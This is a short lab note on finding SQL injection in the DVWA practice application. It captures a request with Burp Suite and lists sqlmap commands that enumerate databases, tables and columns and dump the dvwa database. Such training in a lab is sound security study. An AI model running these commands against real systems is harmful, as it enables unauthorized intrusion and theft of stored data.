
Used for finding SQL Injection vulnerabilities

DVWA > UserID = 1 > Submit (check the URL)

We can use BUrp Suite to get the payload and save it to a txt file and use this file on SQLMAP

**Command to run the tool using request file**

sqlmap -r "SavedRequestFile.txt" --dbs

sqlmap -r "SavedRequestFile.txt" -D dvwa

sqlmap -r "SavedRequestFile.txt" -D dvwa --tables

sqlmap -r "SavedRequestFile.txt" -D dvwa --tables --columns

sqlmap -r "SavedRequestFile.txt" -D dvwa --dump

